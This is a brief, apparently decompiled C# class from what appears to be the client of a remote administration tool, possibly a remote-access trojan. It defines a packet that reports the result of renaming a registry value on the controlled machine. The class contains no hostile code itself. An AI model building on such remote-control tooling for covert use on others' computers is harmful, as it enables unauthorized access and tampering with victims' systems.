using System;

namespace xClient.Core.Packets.ClientPackets;

[Serializable]
public class GetRenameRegistryValueResponse : GInterface4
{
	public string KeyPath { get; set; }

	public string OldValueName { get; set; }

	public string NewValueName { get; set; }

	public bool IsError { get; set; }

	public string ErrorMsg { get; set; }

	public void Execute(GClass33 client)
	{
		client.method_7(this);
	}
}
